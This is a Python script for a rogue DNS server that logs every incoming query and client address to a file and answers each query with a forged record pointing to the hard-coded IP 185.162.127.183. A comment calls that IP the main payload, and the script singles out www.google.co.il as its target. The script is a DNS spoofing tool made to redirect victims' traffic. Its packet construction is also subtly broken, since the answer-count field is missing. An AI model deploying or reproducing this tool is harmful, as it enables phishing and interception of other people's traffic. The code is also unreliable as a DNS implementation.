import socket
import os, sys


DNS_SERVER_IP = '0.0.0.0'
DNS_SERVER_PORT = 53
DEFAULT_CHUNK = 1024
OUTPUT_FILE_PATH = 'incoming_data.txt'

#####
WANTED_INPUT_DOMAIN_DNS_CHANGE = 'www.google.co.il'

WANTED_OUTPUT_IP_DNS_CHANGE = '185.162.127.183'
#####

CRITICAL_REQUEST_COM = b'\x46\x2c\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x02\x63\x6f\x02\x69\x6c\x00\x00\x01\x00\x01'
CRITICAL_REQUEST_IL = b'\xdd\x27\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x02\x63\x6f\x02\x69\x6c\x00\x00\x01\x00\x01'

def convert_to_hexa (bytes_string):

	result = ''
	for byte in bytes_string:
		result += str(hex (byte)) [2:]
	
	return result


def craft_domain_name (bytes_string):

	s = str(bytes_string).split ('\\x')
	result = ''
	for subword in s[1:]:
		tmp_word = subword[2:] + '.'
		result += tmp_word

	result = result [:-3]
	return result


def dns_handler (data, addr, server_socket):

	s = "The data is:\n{0}\nAnd the addr is:\n{1}\n".format(data,addr)
	
	with open (OUTPUT_FILE_PATH, 'a') as f:
		f.write (s)
		f.flush()

	Transaction_ID = data[:2]
	Flags = data[2:4]
	Questions = data[4:6]
	Answer_RRs = data[6:8]
	Authority_RRs = data[8:10]
	Additional_RRs = data[10:12]

	Name = data[12:-4]

	Type = data[-4:-2]
	Class = data[-2:]

	flag = 0

	if (WANTED_INPUT_DOMAIN_DNS_CHANGE != craft_domain_name(Name)):
		print ("dont care")
	
	else:
		print ('bingo')
		flag = 1

	output_Transaction_ID = Transaction_ID
	output_Flags = b'\x81\x80'
	output_Questions = b'\x00\x01'
	output_Authority_RRs = b'\x00\x00'
	output_Additional_RRs = b'\x00\x00'
	output_Queries = data [12:]
	output_Name = b'\xc0\x0c'
	output_Type = Type
	output_Class = Class
	output_TTL = b'\x00\x00\x00\xff'
	output_data_length = b'\x00\x04'
	# check this: main payload here!
	ip_as_bytes = bytes(map(int, WANTED_OUTPUT_IP_DNS_CHANGE.split('.')))

	response = output_Transaction_ID + output_Flags + output_Questions\
	+ output_Authority_RRs+output_Additional_RRs + output_Queries + output_Name\
	+ output_Type + output_Class + output_TTL + output_data_length + ip_as_bytes

	if (flag ==1):
		print (response)

	server_socket . sendto (response, addr)


def dns_udp_server (ip, port):

	server_socket = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
	server_socket.bind ((DNS_SERVER_IP,DNS_SERVER_PORT))
	print ("DNS server started successfully!\n")

	while True:
		try:
			data, addr = server_socket.recvfrom (DEFAULT_CHUNK)
			dns_handler (data, addr, server_socket)

		except Exception as ex:
			print ("Client exception: {}".format (ex))


def main():

	print ("Starting DNS-UDP server..\n")
	dns_udp_server (DNS_SERVER_IP, DNS_SERVER_PORT)


if __name__ == '__main__':
	main()